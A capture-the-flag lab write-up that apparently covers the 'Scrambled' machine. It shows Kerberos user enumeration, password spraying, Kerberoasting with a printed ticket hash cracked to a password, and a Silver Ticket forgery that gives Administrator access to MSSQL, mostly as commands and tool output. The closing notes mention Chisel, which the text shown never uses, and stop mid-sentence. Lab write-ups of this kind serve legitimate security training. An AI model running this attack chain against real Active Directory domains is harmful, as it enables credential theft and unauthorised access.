  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 01/21/23 - Ronnie Flathers @ropnop

2023/01/21 22:44:31 >  Using KDC(s):
2023/01/21 22:44:31 >   10.10.11.168:88

2023/01/21 22:44:31 >  [+] VALID USERNAME:       ASMITH@scrm.local
2023/01/21 22:45:06 >  [+] VALID USERNAME:       JHALL@scrm.local
2023/01/21 22:45:11 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
2023/01/21 22:45:13 >  [+] VALID USERNAME:       KHICKS@scrm.local
2023/01/21 22:45:44 >  [+] VALID USERNAME:       SJENKINS@scrm.local
2023/01/21 22:46:15 >  Done! Tested 13000 usernames (5 valid) in 104.092 seconds
```

There is a web page under port 80 which has information about possible steps that can be made to access the internal network since NTLM is no longer active due to security reasons:

![Security-NTLM](/assets/img/Pasted image 20230511075718.png)

Inspecting the web page we notice that a user's name is being leaked on this image:
![Leaked-user](/assets/img/Pasted image 20230511075506.png)

It is always a good idea to gather more information on kerberos with the structure of the already leaked user for that we can use the following [kerberos usernames list](https://github.com/attackdebris/kerberos_enum_userlists) to enumerate valid user against the kerberos:

```bash
kerbrute userenum --dc 10.10.11.168 -d scrm.local /usr/share/seclists/Discovery/Kerberos/A-ZSurnames.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 05/11/23 - Ronnie Flathers @ropnop

2023/05/11 10:13:53 >  Using KDC(s):
2023/05/11 10:13:53 >   10.10.11.168:88

2023/05/11 10:13:53 >  [+] VALID USERNAME:       ASMITH@scrm.local
2023/05/11 10:14:38 >  [+] VALID USERNAME:       JHALL@scrm.local
2023/05/11 10:14:46 >  [+] VALID USERNAME:       KSIMPSON@scrm.local
2023/05/11 10:14:49 >  [+] VALID USERNAME:       KHICKS@scrm.local
2023/05/11 10:15:24 >  [+] VALID USERNAME:       SJENKINS@scrm.local
```

### Exploitation
We then proceed to abuse this with kerbrute in bruteforce mode to execute a password spraying, sometimes the users use its username as password.

```bash
kerbrute bruteuser --dc 10.10.11.168 -d scrm.local users ksimpson         

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (9cfb81e) - 05/10/23 - Ronnie Flathers @ropnop

2023/05/10 08:41:13 >  Using KDC(s):
2023/05/10 08:41:13 >   10.10.11.168:88

2023/05/10 08:41:14 >  [+] VALID LOGIN:  ksimpson@scrm.local:ksimpson
2023/05/10 08:41:14 >  Done! Tested 2 logins (1 successes) in 0.270 seconds
```

Great! We got a valid user then let's proceed to use crackmapexec to check permissions on various services such as LDAP, SMB and MSSQL:
```bash
#SMB
crackmapexec smb scrm.local -u ksimpson -p ksimpson                            
SMB         scrm.local      445    scrm.local       [*]  x64 (name:scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
SMB         scrm.local      445    scrm.local       [-] scrm.local\ksimpson:ksimpson STATUS_NOT_SUPPORTED

```
Since there is an error on crackmapexec that means NTLM (default mode for crackmapexec) is not supported and also considering the nothe from the website we can conclude that we need to user kerberos for our enumeration (flag -k):

```bash
crackmapexec ldap scrm.local -u ksimpson -p ksimpson -k                      
LDAP        scrm.local      389    DC1.scrm.local   [*]  x64 (name:DC1.scrm.local) (domain:scrm.local) (signing:True) (SMBv1:False)
LDAPS       scrm.local      636    DC1.scrm.local   [+] scrm.local\ksimpson
```

Now that we know that ksimpson account can be executed against LDAP let's proceed to execute a Kerberoasting[^kerberoasting-attack] attack with impacket-GetUserSPNs:
```bash
impacket-GetUserSPNs scrm.local/ksimpson:ksimpson -k -dc-ip dc1.scrm.local -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] CCache file is not found. Skipping...
[-] CCache file is not found. Skipping...
ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
----------------------------  ------  --------  --------------------------  --------------------------  ----------
MSSQLSvc/dc1.scrm.local:1433  sqlsvc            2021-11-03 12:32:02.351452  2023-05-11 09:33:35.130420             
MSSQLSvc/dc1.scrm.local       sqlsvc            2021-11-03 12:32:02.351452  2023-05-11 09:33:35.130420             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$24d27bd260ee324b7e91d298d36bac82$0ef77f99bcc2dd3104492d47169de822889dbf700441f8ce5079d6053ea8d576b18cf0201a06262ef41acb02092f900c7c038a80be268e5190be8a164333a3bc3f3486b6e090efd0bbcdf386e0a893b5234dd1471eb89db9d79dd8e8029480b7cd53c3c9d3ae82d0cb8950f9812f56f02b8cf1d9e789cb1f6e7e59ce4a3d84a940645c5159f187b6c5d3fb84ff2708ccb1e796e6baa0add65b7fc50d5e266797778fd06fba952a63a77f8f0323e17f2f456224765b80b4953aa3cf9e1d59045bd546167c287dcacef1e2f11f089a09a835db0f3875de36ca7ec451bd9af5bd06bbae1f046b6e2cfc223ddb1a2a727520f7c3d0e6b17b90431b726c948cca9ef9e3e025b54e6369b6a874bf2de874ff33dbb0b97c527616b87681ba790bf2937d2dbf3f82043f1112fd3393242f0421bf19c9dc8c03933de4a1da22b69e3fc86544621917d4c90f16c8191ce6167a1e1b88dce8b4f321c65d3c494b5372279ee9409ddfb204ad6ad84b934cfb91edee3092f079efe57f3c92a1151b5a01c155a051dca653a78521f6f3e860c623d99f58f9947d27124ffc53a041f1839e6026350f1e4fa345eb620e8f3b1ee63d2d4cf40791e428c24bcd5e0c2b25d25c91320b76a43f34e7ff5eec94b200d1039ff03134cd7ff44430fb65f5847ffa0e5a543229e4d645368c523310c3a06a451d439fd381b3810561895dddcba4015330d81b81ca830df8e89f88bc2a4ceff65f28af0f84b6e6d7eed8005482a9636d797f461dddc79010507c60f005ff3d38efef26f607ebb47e9d7898fa0daf1af9ac561024b0affc1ade3e29639d499a8c4c8f2ed31cc5fc2e025683b279f83466dad43c1c2fef42352147434c398b69821afb37d7cbdef9924c7fe1aea53af8f1e84e06b4f385675b98282977c39d3416bd471544a1134e0739fbed624b7dd5c6a460105e50c6631c8d1138a655bc9dc3c4ae51470a0ed3054adfb3719eff73ca92554532242f8ddad63b4a4f7f1aca07977e1ddf8bcde3cf661b4a1908fc8da9a481fe08e0aa52a8fad6225b862b58cd5d4664fbd2412832b7da4d484974881ee7bcd8814db1800fe48631a197c87307b167c1d0f5572f6d6b7074cc90bb57ff586bb135b9939614856c6252559edca5521da6c4ff749c222c511a30bcad6ff35e12d41946b327bd78378b9cf48700332b871b8260457c91b3a1c036dc0bed667c6e552ecde7be8bd5a6def019c38536852f73dbde02cf8f3451316e584a00557ffb91a5a6aa383867aac8b87c4ceda400f95ae633f07bf4ba1d79ee80604c424de215ffd0683b11a7f3401eaf6a9e3d8e3492f08edfe6c58d4fad8fa4a46a13422a20f886822898e0c060c1a48d86f13693e6779cffcce09fdba34f30da97d35a3a52c6393088c9ee2b12e8ae3ed11fb40fa3583cb99697015e727376c1
```
This will retrieve both an SPN `MSSQLSvc/dc1.scrm.local` and a its TGS hash which we can decrypt using hashcat and rockyou.txt dictionary:
```bash
D:\Programas\hashcat-6.2.5>hashcat.exe -m 13100 -a 0 hash.txt rockyou.txt
$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$24d27bd260ee324b7e91d298d36bac82$0ef77f99bcc2dd3104492d47169de822889dbf700441f8ce5079d6053ea8d576b18cf0201a0
----------------------SNIP-----------------------
fdba34f30da97d35a3a52c6393088c9ee2b12e8ae3ed11fb40fa3583cb99697015e727376c1:Pegasus60
```
The password is then recovered and so we can try to exploit another services such as MSSQL:

```bash
impacket-mssqlclient scrm.local/sqlsvc:Pegasus60@10.10.11.168 -k -dc-ip dc1.scrm.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[-] CCache file is not found. Skipping...
[-] Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN(Server not found in Kerberos database)
```
After several attempts and so many errors must probably this is not the path to exploit this machine...

An excellent resource to try further attacks against an Active Directory is [WADComs](https://wadcoms.github.io/#spn):

![Wadcoms](/assets/img/Pasted image 20230511211224.png)

An interesting attack is the one with ticketer.py, impacket’s ticketer.py can perform Silver Ticket attacks, which crafts a valid TGS ticket for a specific service using a valid user’s NTLM hash. It is then possible to gain access to that service. To further exploit we need three main things:

- Domain SID
- NTLM Hash
- SPN

And it can be executed as follows:
```bash
python3 ticketer.py -nthash b18b4b218eccad1c223306ea1916885f -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain test.local -dc-ip 10.10.10.1 -spn cifs/test.local john
```

Since we only have an SPN let's try to retrieve the Domain SID first, it can be extracted with `impacket-getPac`, this script will get the PAC of the specified target user just having a normal authenticated user credentials. It does so by using a mix of [MS-SFU]'s S4USelf + User to User Kerberos Authentication with the following command:
```bash
impacket-getPac scrm.local/ksimpson:ksimpson -targetUser Administrator
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
------------------------------------- SNIP ----------------------------------------
Domain SID: S-1-5-21-2743207045-1827831105-2542523200
```
Then we proceed to get the NTLM Hash, this can be done on the following [page](https://codebeautify.org/ntlm-hash-generator)

![Hash-Generator](/assets/img/Pasted image 20230511213706.png)

Once we have all we can proceed to execute a Silver Ticket attack as follows:
```bash
impacket-ticketer -spn MSSQLSvc/dc1.scrm.local -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -dc-ip dc1.scrm.local Administrator -domain scrm.local
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Creating basic skeleton ticket and PAC Infos
[*] Customizing ticket for scrm.local/10.10.11.168
[*]     PAC_LOGON_INFO
[*]     PAC_CLIENT_INFO_TYPE
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Signing/Encrypting final ticket
[*]     PAC_SERVER_CHECKSUM
[*]     PAC_PRIVSVR_CHECKSUM
[*]     EncTicketPart
[*]     EncTGSRepPart
[*] Saving ticket in 10.10.11.168.ccache
```

And this will gives us a .ccache file which then can be abused to login to the machine, first we need to export it to the variable `KR5CCNAME`:
```bash
export KRB5CCNAME=Administrator.ccache
```
Then we can authenticate to MSSQL service without credentials:
```bash
impacket-mssqlclient dc1.scrm.local -k
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(DC1): Line 1: Changed database context to 'master'.
[*] INFO(DC1): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
[!] Press help for extra shell commands
SQL>
```


### Root privesc

### Post Exploitation

### Credentials
```bash
sqlsvc:Pegasus60 NTLM -> B999A16500B87D17EC7F2E2A68778F05
```

### Notes

-   Chisel have different configurations, this time we use a Forward SOCKS Proxy, which is a bind shell, that is not neccessarily the easiest way to forward the remote port, but is a new way to consider in case that a reverse shell is not possible.
-   Always look for exploits, analyze them and check if something can be useful to exploit the machine.
-   Chisel has some

### Resources:

[^ldap-enum]: LDAP Enumeration
[^kerberoasting-attack]: Kerberoasting
